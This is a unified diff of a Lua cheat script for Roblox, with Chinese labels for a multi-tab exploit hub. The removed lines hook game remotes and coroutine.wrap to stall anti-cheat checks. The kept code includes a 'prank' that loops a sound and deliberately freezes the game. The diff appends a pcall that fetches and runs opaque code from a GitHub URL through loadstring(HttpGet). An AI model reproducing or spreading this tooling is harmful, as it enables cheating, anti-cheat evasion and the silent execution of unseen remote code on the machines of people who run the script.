@@ -1,63 +1,3 @@
-local scanned = {}
-local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
-local Players = cloneref(game:GetService("Players"))
-local FindFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/GcViewerV2/refs/heads/main/Utility/FindFunction.lua"))()
-local Class,Default = loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/GcViewerV2/refs/heads/main/Utility/Data2Code%40Amity.lua"))()
-getgenv().Log = getgenv().Log or function(...) print(...) end
-
-local PlayerName = game.Players.LocalPlayer.Name
-
-local function hookRemote(remote)
-    if remote:IsA("RemoteEvent") then
-        local oldFire
-        oldFire = hookfunction(remote.FireServer, function(self, ...)
-            local args = {...}
-            if args[1] and (tostring(args[1]):lower() == "x-15" or tostring(args[1]) == "X-15") or (tostring(args[1]):lower() == "x-16" or tostring(args[1]) == "X-16") then
-                return task.wait(9e9)
-            end
-            return oldFire(self, unpack(args))
-        end)
-    end
-end
-local function isRemote(obj)
-    return typeof(obj) == "Instance" and obj:IsA("RemoteEvent")
-end
-local function deepScan(value)
-    if scanned[value] then return end
-    scanned[value] = true
-    if isRemote(value) then
-        if not value:IsDescendantOf(ReplicatedStorage) then
-            hookRemote(value)
-            local Old 
-            Old = hookfunction(getrenv().coroutine.wrap, function(...)
-                if not checkcaller() then
-                    print(...,getfenv(2).script)
-                   return task.wait(9e9)
-                end
-                return Old(...)
-            end)
-        end
-        return
-    end
-    if typeof(value) == "function" then
-        local upvalues = getupvalues(value)
-        for i, v in pairs(upvalues) do
-            deepScan(v)
-        end
-    end
-    if typeof(value) == "table" then
-        for k, v in pairs(value) do
-            deepScan(v)
-        end
-    end
-end
-
-for _, obj in next, getgc(true) do
-    if typeof(obj) == "function" and islclosure(obj) and not isexecutorclosure(obj) then
-        deepScan(obj)
-    end
-end
-
 -- 加载动画
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -71,7 +11,7 @@ local CONFIG = {
     PRIMARY_COLOR = Color3.fromRGB(0, 150, 255),  -- 改回蓝色主题
     SECONDARY_COLOR = Color3.fromRGB(0, 120, 220),
     GLOW_INTENSITY = 0.6,
-    LOGO_IMAGE = "rbxassetid://6954167216",
+    LOGO_IMAGE = "rbxassetid://137107933084759",
     LOGO_TEXT = "作者：皮炎 司空",
     BORDER_COLOR = Color3.fromRGB(0, 100, 200),
     BORDER_THICKNESS = 2,
@@ -93,7 +33,7 @@ local CONFIG = {
 
 ContentProvider:PreloadAsync({
     CONFIG.LOGO_IMAGE,
-    "rbxassetid://5028857084"
+    "rbxassetid://109223169214001"
 })
 
 local screenGui = Instance.new("ScreenGui")
@@ -676,7 +616,7 @@ function initMainScript()
     -- 创建各个标签页
     local Tabs = {
         Main = Window:Section({ Title = "主界面", Opened = true }),
-        Core = Window:Section({ Title = "通用", Opened = true }),
+        Core = Window:Section({ Title = "核心功能", Opened = true }),
         Teleport = Window:Section({ Title = "传送功能", Opened = true }),
         Translate = Window:Section({ Title = "极速汉化", Opened = true }),
         Strongest = Window:Section({ Title = "最强战场", Opened = true }),
@@ -692,7 +632,7 @@ function initMainScript()
 
     local TabHandles = {
         Main = Tabs.Main:Tab({ Title = "主界面", Icon = "home" }),
-        Core = Tabs.Core:Tab({ Title = "通用功能", Icon = "zap" }),
+        Core = Tabs.Core:Tab({ Title = "核心功能", Icon = "zap" }),
         Teleport = Tabs.Teleport:Tab({ Title = "传送功能", Icon = "navigation" }),
         Translate = Tabs.Translate:Tab({ Title = "极速汉化", Icon = "languages" }),
         Strongest = Tabs.Strongest:Tab({ Title = "最强战场", Icon = "crosshair" }),
@@ -754,9 +694,9 @@ function initMainScript()
         Color = Color3.fromHex("#00A2FF")
     })
 
-    -- ========== 通用功能标签页 ==========
+    -- ========== 核心功能标签页 ==========
     TabHandles.Core:Paragraph({
-        Title = "通用功能",
+        Title = "核心功能",
         Desc = "游戏基础功能修改",
         Image = "zap",
         ImageSize = 20,
@@ -887,11 +827,11 @@ function initMainScript()
     })
 
     TabHandles.Core:Button({
-        Title = "飞行",
+        Title = "飞行模式",
         Icon = "wind",
         Callback = function()
             Notification:Notify(
-                {Title = "飞行", Description = "正在加载飞行脚本..."},
+                {Title = "飞行模式", Description = "正在加载飞行脚本..."},
                 {OutlineColor = Color3.fromRGB(0, 100, 200),Time = 3, Type = "image"},
                 {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(0, 150, 255)}
             )
@@ -2499,7 +2439,7 @@ function initMainScript()
                     sound:Play()
                     
                     -- 等待音效播放完成
-                    wait(3)
+                    wait(1)
                     
                     -- 循环播放音效
                     while true do
@@ -2511,7 +2451,7 @@ function initMainScript()
                 prankGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
                 
                 -- 等待确保界面和声音都显示/播放了
-                wait(3)
+                wait(1)
                 
                 -- 卡死游戏
                 while true do
@@ -2653,3 +2593,8 @@ function initMainScript()
 
     print("皮空重置 - WindUI界面初始化完成！")
 end
+
+pcall(function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/smalldesikon/eyidfki/a53d5face05b0a8e732ca27a905a78186d869131/%E5%8C%97%E4%BA%AC%E6%97%B6%E9%97%B4"))()
+     print("✅ 执行成功")
+ end)
